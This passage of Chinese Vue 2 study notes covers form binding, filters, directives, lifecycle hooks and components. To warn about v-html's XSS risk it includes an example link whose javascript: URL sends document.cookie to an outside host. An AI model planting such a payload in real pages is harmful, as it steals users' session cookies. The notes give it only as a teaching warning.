    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <form action="" @submit.prevent="demo">
            <!-- <label for="demo">账号：</label> -->
            <!--效果较好，可以使用户点击账号的文字时显示光标 -->
            <!-- trim 可以使用户输入时忽略字符串前面和后面的空格，字符串之间的空格则不会消失 -->
            账号：<input type="text" v-model.trim="UserInfo.account"><br /><br />
            密码：<input type="password" v-model="UserInfo.password"><br /><br />
            年龄：<input type="number" v-model.number="UserInfo.age"><br /><br />
            性别:
            男：<input type="radio" name="sex" v-model="UserInfo.sex" value="male">
            女:<input type="radio" name="sex" v-model="UserInfo.sex" value="female"><br /><br />
            爱好：
            学习<input type="checkbox" v-model="UserInfo.hobby" value="study">
            打游戏<input type="checkbox" v-model="UserInfo.hobby" value="game">
            吃饭<input type="checkbox" v-model="UserInfo.hobby" value="eat"><br /><br />
            所属校区：
            <select v-model="UserInfo.city">
                <option value="">请选择校区</option>
                <option value="beijing">北京</option>
                <option value="shanghai">上海</option>
                <option value="tianjin">天津</option>
                <option value="shenzhen">深圳</option>
            </select><br /><br />
            其他信息：
             <textarea row="3" v-model.lazy="UserInfo.other"></textarea><br /><br />
            <input type="checkbox" v-model="UserInfo.agree">阅读并接受<a
                href="https://v2.cn.vuejs.org/v2/guide/list.html#%E6%9B%BF%E6%8D%A2%E6%95%B0%E7%BB%84">《用户协议》</a>
            <button>提交</button>
        </form>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        const vm = new Vue({
            el: '#root',
            data: {
                UserInfo: {
                    account: '',
                    password: '',
                    age:'',                    
                    sex: 'female',
                    hobby: [],
                    city: 'beijing',
                    other: '',
                    agree: ''
                }
            },
            methods: {
                demo() {
                    console.log(JSON.stringify(this.UserInfo));
                }
            }
        })
    </script>
</body>
</html>
```

![image-20230921094349733](D:\typora_photo\image-20230921094349733.png)

### 2.10 过滤器

#### 2.10.1  **理解过滤器**

1. 功能: 对要显示的数据进行特定格式化后再显示

2. 注意: 并没有改变原本的数据, 是产生新的对应的数据

#### 2.10.2 过滤器使用

Day.js 是一个轻量的处理时间和日期的 JavaScript 库，和 Moment.js 的 API 设计保持完全一样.处理时间的moment体积较大，dayjs轻量级。

```js
dayjs().startOf('month').add(1, 'day').set('year', 2018).format('YYYY-MM-DD HH:mm:ss');
```

##### 过滤器

定义：对要显示的数据进行**特定格式化后再显示**(适用于一些简单逻辑的处理)。例如将金额1999====>1,999可以用过滤器来实现。
语法：
         1.注册过滤器：**Vue.filter(name,callback)或new Vue{filters:{}}** 

​         2.使用过滤器：**{{xxx|过滤器名}} 或v-bind属性="xxx|过滤器名"**

备注: 
        1.过滤器也可以接收额外参数、多个过滤器也可以串联，**过滤器中默认第一个参数就是绑定过滤器的元素**，第二个参数之后可以自定义。
        2.**并没有改变原本的数据，是产生新的对应的数据** 

##### 示例

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <script src="../js/dayjs.js"></script>
</head>
<body>
    <div id="root">
      <h2>显示时间</h2>
      <h3>现在是：{{time}}</h3>
      <h3>现在是：{{timeFormater}}</h3>
      <h3>现在是：{{getTimeFormat()}}</h3>
      <h3>现在是：{{time | formatTime('YYYY-MM') | myslice}}</h3>
      <h3>现在的月份是：{{time | formatTime('YYYY-MM') | sliceTime}}</h3>
      <h4 :x="name | sliceTime">尚硅谷</h4>
 <!-- <input type="text" v-model="msg | sliceTime"> 不可以在v-model身上添加过滤器-->
    </div>
    <div id="root1">
        <h3>现在是：{{msg | sliceTime}}</h3>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        //定义全局过滤器
        Vue.filter('sliceTime',function(value){
            return value.slice(5,7);
        })
        new Vue({
            el: '#root',
            data: {
                time: 1695261040865,
                name:'hellonh'
            },
            computed:{
                timeFormater(){
                    return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss');
                }
            },
            methods:{
                getTimeFormat(){
                    return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss');
                }
            },
            filters:{
                formatTime(value,str='YYYY-MM-DD HH:mm:ss'){
                    return dayjs(value).format(str)
                },
                myslice(val){
                    return val.slice(0,4);
                }
            }
        })
        new Vue({
        el:'#root1',
        data:{
            msg:'欢迎你的到来噢哈哈'
        }
        })
    </script>
</body>
</html>
```

![image-20230921101851807](D:\typora_photo\image-20230921101851807.png)

### 2.11 内置指令与自定义指令

#### 2.11.1 **常用内置指令**

##### **v-text** : 

​     更新元素的 textContent，向其所在的节点中渲染文本内容

​      与插值语法的区别：**v-text会替换掉节点中的内容，{{xx}}则不会**。

![image-20230921103741456](D:\typora_photo\image-20230921103741456.png)

![image-20230921103755549](D:\typora_photo\image-20230921103755549.png)

##### **v-html** 

  1.作用：向指定节点中渲染包含html结构的内容。
  2.与插值语法的区别：
             (1) **v-html会替换掉节点中所有的内容**，{{xx}}则不会。
             (2) v-html可以**识别html结构**。
  3.**严重注意:v-html有安全性问题XSS攻击  !!!!**
            (1)  在网站上动态渲染任意HTML是非常危险的，容易**导致 XSS攻击**。 
            (2)  一定要在**可信的内容上使用v-html**，永不要用在用户提交的内容上!

##### v-once

​    1.**v-once在节点在初次动态渲染后，就视为静态内容了**。

      2.  以后**数据的改变不会引起v-once所在结构的更新**。可以用于优化性能。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2 v-once>初始值是{{n}}</h2>
        <h2>当前值是{{n}}</h2>
        <button @click="n++">点我加1</button>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    new Vue({
        el: '#root',
        data: {
            n: 1
        }
    })
</script>

</html>
```

![image-20230921115703093](D:\typora_photo\image-20230921115703093.png)

使用场景：

（1）

（2）

##### v-pre

1. **跳过其所在节点的编译过程**。

2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会**加快编译**。

   

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2 v-pre>其实很简单</h2>
        <!-- <h2 v-pre>当前值是{{n}}</h2>
        <button v-pre @click="n++">点我加1</button> vue不会进行编译-->
        <h2 >当前值是{{n}}</h2>
        <button  @click="n++">点我加1</button>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    new Vue({
        el: '#root',
        data: {
            n: 1
        }
    })
</script>
</html>
```

![image-20230921120252872](D:\typora_photo\image-20230921120252872.png)

若所有语句都加上：

![image-20230921120318064](D:\typora_photo\image-20230921120318064.png)

v-if : 如果为 true, 当前标签才会输出到页面，条件渲染(动态控制节点是否存存在) 

v-else: 如果为 false, 当前标签才会输出到页面，条件渲染(动态控制节点是否存存在) 

v-show : 通过控制 display 样式来控制显示/隐藏

v-for : 遍历数组/对象

v-on : 绑定事件监听, 一般简写为@

v-bind : 单向绑定解析表达式，可简写为:xxx

v-model : 双向数据绑定

**v-cloak** : **防止闪现**, 与 css 配合: [v-cloak] { display: none }

v-cloak指令(**没有值**):
        1.本质是一个特殊属性**，Vue实例创建完毕并接管容器后，会删掉v-cloak属性**。
        2.使用css配合v-cloak**可以解决网速慢时页面展示出{{xxx}}的问题**。

一个应用场景：当页面的vue.js是延迟加载的，并且该文件插入到DOM元素后面（即是body元素之前），此时页面的DOM元素会先加载出现在页面上，但是模板里面的{{name}}还没有解析，需要等待vue,js文件加载完毕后，vue实例运行解析模板才出现真实的值，如果在这个过程中为{{name}}的标签加上一个v-cloak指令，以及css样式，就会在加载vue.js的过程中不显示未解析dom元素，当vue,js文件加载完毕后，显示真实值，v-cloak随之消失。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        [v-cloak] {
            display: none;
        }
    </style>
</head>
<body>
    <div id="root">
        <h2 v-cloak>{{name}}</h2>
    </div>
    <script type="text/javascript" src="../js/vue.js"></script>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    new Vue({
        el: '#root',
        data: {
            name: "你好",
        }
    })
</script>
</html>
```

#### 2.11.2 网站中的cookie的交互

##### cookie交互过程

![image-20230921105318123](D:\typora_photo\image-20230921105318123.png)

![image-20230921105501830](D:\typora_photo\image-20230921105501830.png)

##### 示例：v-html的安全性问题

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <div>{{name}}</div>
        <!-- 功能相似 -->
        <div v-html="str">哈哈</div>
        <div v-html="str1"></div>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        new Vue({
            el: '#root',
            data: {
                name: "你好",
                str: '<h3>你好呀</h3>',
                str1: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>重要信息</a>'
            }
        })
    </script>
</body>
</html>
```

![image-20230921111541827](D:\typora_photo\image-20230921111541827.png)

![image-20230921111550894](D:\typora_photo\image-20230921111550894.png)

#### 2.11.2 自定义指令

1.注册全局指令

2.注册局部指令

##### 注意：

自定义指令的过程中，通过函数的方式构造指令，其中传入的两个参数分别是element与binding，即是真实dom元素与包含有自定义指令信息的对象：

![image-20230921210506981](D:\typora_photo\image-20230921210506981.png)

![image-20230921164824434](D:\typora_photo\image-20230921164824434.png)







##### **总结**

一、定义语法:
(1)  局部指令:

```js
 new Vue({ 
     directives:{指令名:配置对象}
     }) 
//或者
new Vue({ 
    directives{指令名:回调函数} 
    })
//这两种方式并不是一定能够相互转化的，当需要某些操作需要等元素加载到页面后才操作，就需要使用配置对象
```

(2)  全局指令:
Vue.directive(指令名,配置对象) 或  Vue.directive(指令名，回调函数) 

![image-20230921211125931](D:\typora_photo\image-20230921211125931.png)

二、配置对象中常用的3个回调：

```
(1) bind:指令与元素成功绑定时调用。
(2) inserted:指令所在元素被插入页面时调用。
(3) update:指令所在模板结构被重新解析时调用。
```

三、备注:

```
1.指令定义时不加v-，但使用时要加v-;
2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
3.如果自定义指令名是v-bigNumber，vue是会识别为v-bignumber，当有两个名词组成时可以写成v-big-number，而不采取驼峰命名法，同时在directives中的指令名要加引号。
4.input和v-fbind建立绑定时仅仅在内存上建立联系，并不是input元素添加到页面
```

![image-20230921211307068](D:\typora_photo\image-20230921211307068.png)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>其实很简单{{name}}</h2>
        <h2>当前值是<span v-text="n"></span></h2>
        <h2>放大10倍后的值是<span v-big="n"></span></h2>
        <h2>放大20倍后的值是<span v-big-number="n"></span></h2>
        <button @click="n++">点我加1</button><hr/>
        <input type="text" v-fbind:value="n">
    </div>
    <div id="root2">
        <h2>加20后的值是<span v-fbinding="n"></span></h2>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    //定义自定义的全局指令
    Vue.directive('fbinding',function(element, binding){
        element.innerText = binding.value + 20;
    })
    new Vue({
        el: '#root',
        data: {
            name: 'anquan',
            n: 1
        },
        directives: {
            //big函数何时调用？1.指令与元素成功绑定时（一上来）2.指令所在的模板被重新解析时
            big(element, binding) {
                console.log(element);
                console.log(binding);
                element.value = binding.value * 10;
            },
            'big-number'(element, binding){
                element.innerText = binding.value * 20;
            },
            fbind: {
                //指令与元素成功绑定时
                bind(element, binding) {
                    element.value = binding.value * 10;
                },
                //指令所在的元素被插入页面时
                inserted(element, binding) {
                    element.focus();     //获得焦点，或者例如改变父元素某些属性
                },
                //指令所在的模板被重新解析时
                update(element, binding) {
                    element.value = binding.value * 10;
                }
            }
        }
    })
    new Vue({
    el:'#root2',
    data:{
        n:10
    }
    })
</script>
</html>
```

![image-20230921211508658](D:\typora_photo\image-20230921211508658.png)

### 2.11 **Vue 实例生命周期**

#### 2.11.1 引入生命周期

生命周期:

- **又名**:生命周期回调函数、生命周期函数、生命周期钩子。
- **是什么**:Vue在关键时刻带我们调用的一些特殊名称的雨数。
- **生命周期函数的名字不可更改**，但数的具体内容是程序员根据需求编写的。
- 生命周期函数中的**this指向是vm或组件实例对象**。

示例：改变元素透明度，动态效果

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <!-- <h2 :style="{opacity: opacity}"></h2> -->
        <!-- 对象中两个重名，简写 -->
        <h2 :style="{opacity}">vue的生命周期</h2>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        new Vue({
            el: '#root',
            data: {
                opacity: 1,
            },
            //Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
            mounted() {
                console.log('mounted', this);//vue实例
                setInterval(() => {
                    this.opacity = this.opacity - 0.01
                    if (this.opacity <= 0) {
                        this.opacity = 1
                    }
                }, 16);
            },
        })
        //通过外部定时器实现（不推荐）
        // setInterval(() => {
        //     vm.opacity=vm.opacity-0.01
        //    if( vm.opacity<=0){
        //     vm.opacity=1
        //    }
        // }, 16);
    </script>
</body>
</html>
```

<video src="D:\typora_photo\引入生命周期.mp4"></video>

#### 2.11.2 **生命周期流程图**

![image-20230922181224433](D:\typora_photo\image-20230922181224433.png)

![image-20230922213029396](D:\typora_photo\image-20230922213029396.png)

（1）关于中间的判断部分，其中的outerHTML和innerHTML的解释：

！[image-20230921223330214](D:\typora_photo\image-20230921223330214.png

![image-20230921230325346](D:\typora_photo\image-20230921230325346.png)

（2）在beforeMount执行，Mounted执行之前,都是未解析的DOM，都是如果强制使用原生js修改DOM的值是可以的，页面会在改变，但是当页面执行了Mounted之后，该改变会失效，vue根据之前设定好的虚拟DOM解析为真实的DOM。

![image-20230921230731496](D:\typora_photo\image-20230921230731496.png)

原生js修改：

![image-20230922220135331](D:\typora_photo\image-20230922220135331.png)

（3）template配置项：

​        若要换行的用``，若不换行也可以用单引号'  '，template这样子不报错，但是不能作为根标签，外面需要用一个div包裹，不然会出错。

![image-20230921231953048](D:\typora_photo\image-20230921231953048.png)

（4） beforeDestroy() ：在此阶段各种方法还有data是不会再进行更新以及起作用的，但是原生的DOM方法是存  在的，但是是失效的。

  (5)**beforeDestroy的下一个阶段：此阶段销毁的是所有监听，子组件以及其自定义事件，原生的Dom方法不被销毁（但是现在版本的浏览器已经不显示原生DOM方法的存在了）。**

![image-20230925234123173](D:\typora_photo\image-20230925234123173.png)



（5）销毁一个vue实例的方式：

```js
vm.$destroy()
用法：完全销毁一个实例。清理它与其它实例的连接，解绑它的全部指令及事件监听器（这里是指自定义的事件，dom元素身上的@事件属于原生DOM事件）。触发 beforeDestroy 和 destroyed 的钩子。
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h3>当前值是:{{n}}</h3>
        <button @click="add">点击加1</button>
        <button @click="bye">点我销毁</button>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        new Vue({
            el: '#root',
            // template:
            //     `<div>
            //     <template>
            //     <h3>当前值是:{{n}}</h3>
            //     <button @click="add">点击加1 </button>
            //     </template> 
            //     </div>`,
            data: {
                n: 1
            },
            methods: {
                add() {
                    console.log('add');
                    this.n++;
                },
                bye() {
                    console.log('bye');
                    this.$destroy()
                }
            },
            beforeCreate() {
                console.log('beforeCreate');
                //console.log(this);//不包含_data以及方法的vue实例
                //debugger;//设置断点表示运行到这里就不执行了
            },
            created() {
                console.log('created');
                //console.log(this);//vue实例，包含data数据以及方法，数据监测与数据代理有了
            },
            beforeMount() {
                console.log('beforMount');//此时的DOM元素还没有解析
                debugger

            },
            mounted() {
                console.log('mounted');
        // document.querySelector('h2').innerText='哈哈';//页面会改变，但是尽可能不要这样子写
         //console.log(this.$el instanceof HTMLElement);//true
            },
            beforeUpdate() {//页面和数据未保持同步
                console.log('beforeUpdate');
                // console.log(this.n);
                // debugger;
            },
            updated() {
                console.log('updated');
                // console.log(this.n);
                // debugger;
            },
            beforeDestroy() { 
           //在此阶段各种方法还有data是不会再进行更新以及起作用的，但是原生的DOM方法是存在的
                console.log('beforeDestroy');
                this.add();
            },
            destroyed() {
                console.log('destroyed');
            }
        })
    </script>
</body>
</html>
```

![image-20230922221033479](D:\typora_photo\image-20230922221033479.png)

#### 2.11.3 总结生命周期

（1）常用的生命周期钩子:

- mounted：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
- beforeDestroy：清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

（2）关于销毁Vue实例

- **销毁后借助Vue开发者工具看不到任何信息**。
- **销毁后自定义事件会失效，但原生DOM事件依然有效**。
- **一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了**。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <!-- <h2 :style="{opacity: opacity}"></h2> -->
        <!-- 对象中两个重名，简写 -->
        <h2 :style="{opacity}">vue的生命周期</h2>
        <button @click="opacity=1">点击透明度为1</button>
        <button @click="stop">点击停止变换</button>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        new Vue({
            el: '#root',
            data: {
                opacity: 1,
            },
            methods: {
                stop(){
                    this.$destroy();
                }
            },
            //Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
            mounted() {
                console.log('mounted', this);//vue实例
                this.timer=setInterval(() => {
                    this.opacity = this.opacity - 0.01
                    if (this.opacity <= 0) {
                        this.opacity = 1
                    }
                }, 16);
            },
            beforeDestroy() {
                clearInterval(this.timer)//停止定时器
                console.log('vm即将销毁');
            },
        })
    </script>
</body>
</html>
```

当点击右边按钮时，销毁vue实例，此时透明度不变，当点击左边按钮时透明度也不会再改变。

![image-20230922221541447](D:\typora_photo\image-20230922221541447.png)

## 三、 **Vue 组件化编程**

### 3.1 概述

![image-20230922224559301](D:\typora_photo\image-20230922224559301.png)

![image-20230922225013254](D:\typora_photo\image-20230922225013254.png)

![image-20230922225709359](D:\typora_photo\image-20230922225709359.png)

### **3.2  模块与组件、模块化与组件化**

#### **3.2.1. 模块**

1. 理解: 向外提供特定功能的 js 程序, **一般就是一个 js 文件**

2. 为什么: js 文件很多很复杂

3. 作用: **复用 js, 简化 js 的编写, 提高 js 运行效率**

#### **3.2.2. 组件**

1. 理解: ***用来实现局部(特定)功能效果的代码集合(html/css/js/image…..)***

2. 为什么: 一个界面的功能很复杂
3. 作用: **复用编码, 简化项目编码, 提高运行效率**

#### **3.2.3. 模块化**

​     当应用中的 js 都以模块来编写的, 那这个应用就是一个模块化的应用。

#### **3.2.4. 组件化**

​     当应用中的功能都是**多组件**的方式来编写的, 那这个应用就是一个组件化的应用,。

### **3.3  非单文件组件**

####     3.3.1 基本使用

非单文件组件定义：一个文件中包含有n个组件 。

单文件组件定义：一个文件中只包含有1个组件 

- 模板编写没有提示

- 没有构建过程, 无法将 ES6 转换成 ES5

- 不支持组件的 CSS

- 真正开发中几乎不用

#### 1. vue注册组件的步骤

 Vue中使用组件的三大步骤: 

​         一、定义组件(创建组件) 

​         二、注册组件 

​         三、 使用组件(写组件标签) 

##### 一、如何定义一个组件? 

​        使用**vue.extend(options)**创建。其中options 和 newVue(options)时传入的那个options几乎一样，但也有点区别: 

区别如下: 

​       1.el 不要写，为什么? ——最终所有的组都要经过一个vm的管理。由vm中的e决定服务哪个容器。 

​        2.  **data必须写成函数**。为什么?——**避免组被复用时，数据存在引用关系**。

备注: 使用template可以配置组件结构。 

##### 二、如何注册组件? 

1.局部注册:  靠new  Vue的时候传入components选项

2.全局注册:   靠**Vue.component(''组件名''，组件)** 

##### 三、编写组件标签

<school></school>

解释为什么data必须是函数：

![image-20230922233015445](D:\typora_photo\image-20230922233015445.png)

![image-20230923103115105](D:\typora_photo\image-20230923103115105.png)

注意：使用函数时，当两个值中有一个改变对象属性，另一个值是不受影响。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <!-- 第三步 编写组件标签 -->
        <school></school>
        <!-- 复用 -->
        <school></school>
        <hr />
        <student></student>
        <hello></hello>
    </div>
    <div id="root1">
        <hello></hello>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        //第一步 创建组件
        const school = Vue.extend({
            // el:'#root' 组件定义时，一定不要写el配置项，因为最终所在的组件都要被一个vm管控，由vm决定服务哪一个标签
            template: `
            <div>
                <h3>学校名称：{{schoolName}}</h3>
                <h3>学校地址：{{address}}</h3>
                <button @click="showInfo">点击</button>
            </div>
            `,
            data() {
                return {
                    schoolName: "拧梦",
                    address: '北京'
                }
            },
            methods: {
                showInfo(){
                    alert('111');
                }
            },
        })
        const student = Vue.extend({
            template: `
            <div>
                <h3>学生名称：{{studentName}}</h3>
                <h3>学生年龄：{{age}}</h3>
            </div>
            `,
            data() {
                return {
                    studentName: 'zhangsan',
                    age: 12
                }
            }
        })
        const hello = Vue.extend({
            template: `
            <div>
                <h3>结束语：{{line}}</h3>
            </div>
            `,
            data() {
                return {
                    line: 'Thanks for listening',
                }
            }
        })
        //全局注册组件
        Vue.component('hello', hello)
        //创建vm
        new Vue({
            el: '#root',
            data: {
                n: 1
            },
            //第二步：注册局部组件
            components: {
                //相当于school(组件名):school(定义的组件名称中间量)
                school,
                student
            }
        })
        new Vue({
            el: '#root1',
            components: {
                hello
            }
        })
    </script>
</body>
</html>
```

![image-20230923103254868](D:\typora_photo\image-20230923103254868.png)

![image-20230923113635773](D:\typora_photo\image-20230923113635773.png)

#### 2. 组件编写的几个注意点

1.  关于组件名:
    一个单词组成:
           第一种写法(首字母小写):schoo1
           第二种写法(首字母大写): School
    多个单词组成:
          第一种写法(kebab-case命名):my-school
          第二种写法(CamelCase命名):MySchool(需要Vue脚手架支持)
    备注:
          (1)组件名尽可能**回避HTML中已有的元素名称**，例如:h2、H2都不行。
          (2)可以使用**name配置项指定组件在开发者工具中呈现的名字**。

2.关于组件标签:
         第一种写法:<school></school>
         第二种写法:<school/>
         备注:不用使用脚手架时，<school/>会导致后续组件不能渲染。
3.一个简写方式:
      const school =Vue.extend(options)可简写为:**const  school =  options**（一个对象），**因为父组件components引入时会自动创建**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <my-school></my-school>
        <!-- 出现多个自闭和标签时，需要配合脚手架使用，否则看不出效果 
        <my-school/>
        <my-school/>
        <my-school/>-->
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        const s = Vue.extend({
            name:'Atguigu',
            template: `
            <div>
                <h3>学校名称：{{schoolName}}</h3>
                <h3>学校地址：{{address}}</h3>
            </div>
            `,
            data() {
                return {
                    schoolName: "拧梦",
                    address: '北京'
                }
            }
        })
        //组件简写方式
        // const s = {
        //     name:'Atguigu',
        //     template: `
        //     <div>
        //         <h3>学校名称：{{schoolName}}</h3>
        //         <h3>学校地址：{{address}}</h3>
        //     </div>
        //     `,
        //     data() {
        //         return {
        //             schoolName: "拧梦",
        //             address: '北京'
        //         }
        //     }
        // }
        new Vue({
            el: '#root',
            data: {
                n: 1
            },
            components: {
                //相当于school(组件名):school(定义的组件名称中间量)
                'my-school':s
                //School:s
                //school:s 
            }
        })
    </script>
</body>
</html>
```

![image-20230923105901170](D:\typora_photo\image-20230923105901170.png)

#### 3.3.2  组件的嵌套

##### 1.结构图

![image-20230923114320263](D:\typora_photo\image-20230923114320263.png)

##### **2.示例**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
    <app></app>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        //第一步 创建组件
        const student = Vue.extend({
            name: 'student',
            template: `
            <div>
                <h3>学生名称：{{studentName}}</h3>
                <h3>学生年龄：{{age}}</h3>
            </div>
            `,
            data() {
                return {
                    studentName: 'zhangsan',
                    age: 12
                }
            }
        })
        const school = Vue.extend({
            name: 'school',
            template: `
            <div>
                <h3>学校名称：{{schoolName}}</h3>
                <h3>学校地址：{{address}}</h3>
                <student></student>
            </div>
            `,
            data() {
                return {
                    schoolName: "拧梦",
                    address: '北京'
                }
            },
            components: {
                student
            }
        })
        const hello = Vue.extend({
            template: `
            <div>
                <h3>结束语：{{line}}</h3>
            </div>
            `,
            data() {
                return {
                    line: 'Thanks for listening',
                }
            }
        })
        const app = Vue.extend({
            template: `<div><school></school>
                       <hello></hello></div>`,
            components: {
                school, hello
            }
        })
        //全局注册组件
        Vue.component('hello', hello)
        //创建vm
        new Vue({
            el: '#root',
            // template:`<app></app>`,
            data: {
                n: 1
            },
            //第二步：注册局部组件
            components: {
                //相当于school(组件名):school(定义的组件名称中间量)
                app
            }
        })
    </script>
</body>
</html>
```

![image-20230923114905121](D:\typora_photo\image-20230923114905121.png)



![image-20230923165041131](D:\typora_photo\image-20230923165041131.png)

#### 3.3.3 VueComponent 组件化实例

关于VueComponent:

1.schoo1组件本质是一个名为**VueComponent的构造函数**，且不是程序员定义的，**是Vue.extend生成的。**

2.我们只需要写<schoo1/>或<schoo1></school>，**Vue解析时会帮我们创建schoo组件的实例对象，即vue帮我们执行的:new VueComponent(options)**，此时才会有VueComponent的实例

![image-20230923221258336](D:\typora_photo\image-20230923221258336.png)

3.特别注意:每次调用Vue.extend，返回的都是一一个全新的VueComponent!!!! **验证方法见代码**

![image-20230923171126854](D:\typora_photo\image-20230923171126854.png)

![image-20230923171426718](D:\typora_photo\image-20230923171426718.png)

4.关于this指向:
   (1)  **组件配置中**:
         data函数、methods中的函数、watch中的雨数、computed中的函数它们**的this均是【VueComponent实例对象】**。

  (2)  new Vue()配置中:
       data内数、methods中的函数、watch中的函数。computed中的函数它们的this均是【Vue实例对象】。

5.VueComponent的实例对象。以后简称vc(也可称之为:**组件实例对象**)。 Vue的实例对象，以后简称vm

vc与vm的关系：

![image-20230923172537877](D:\typora_photo\image-20230923172537877.png)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <school></school>
        <hello></hello>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        const school = Vue.extend({
            template: `
            <div>
                <h3>学校名称：{{schoolName}}</h3>
                <h3>学校地址：{{address}}</h3>
                <button @click="showName">点我显示名字</button>
            </div>
            `,
            data() {
                return {
                    schoolName: '尚硅谷',
                    address: '北京'
                }
            },
            methods: {
                showName() {
                    alert(this.schoolName)
                    console.log('showName', this);//VueComponent实例
                }
            },
        })
        const test = Vue.extend({
            template: `
            <div>
              <h3>欢迎光临{{hu}}</h3>
            </div>
            `,
            data() {
                return {
                    hu: '天津啊'
                }
            }
        })
        const hello = Vue.extend({
            template: `
            <div>
              <h3>欢迎光临{{name}}</h3>
              <test></test>
            </div>
            `,
            data() {
                return {
                    name: '上海'
                }
            },
            components: {
                test
            }
        })
        console.log('@', school);
        console.log('#', hello);
        console.log(school === hello);//验证方式一 false
        school.a = 99 //验证方法二 在控制台输入hello.a验证
        const vm = new Vue({
            el: '#root',
            components: {
                school, hello
            }
        })
    </script>
</body>
</html>
```

![image-20230923222138909](D:\typora_photo\image-20230923222138909.png)

#### 3.3.4 vc与vm的关系区别

组件是可复用的 Vue 实例，所以它们与 `new Vue` 接收相同的选项，例如 `data`、`computed`、`watch`、`methods` 以及生命周期钩子等。仅有的例外是像 `el` 这样根实例特有的选项。

**一个组件的 `data` 选项必须是一个函数**，因此每个实例可以维护一份被返回对象的独立的拷贝。

#### 3.3.5 一个重要的内置关系

##### 回顾：原型基础

```js
       function Demo(){
            this.a=1;
            this.b=2
        }
        const d=new Demo();
        console.log(Demo.prototype);//显式原型属性  object
        console.log(d.__proto__);//隐式原型属性  object
        console.log(d);//Demo {a: 1, b: 2}
        console.log(Demo.prototype===d.__proto__);//true
        Demo.prototype.x=99
        console.log(d.__proto__.x);//99
        console.log(d.x);//99
```

注意：prototype是用于输出构造函数的原型对象，下划线proto是用于输出实例的原型属性的。

![image-20230923225102286](D:\typora_photo\image-20230923225102286.png)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
<school></school>
    </div>
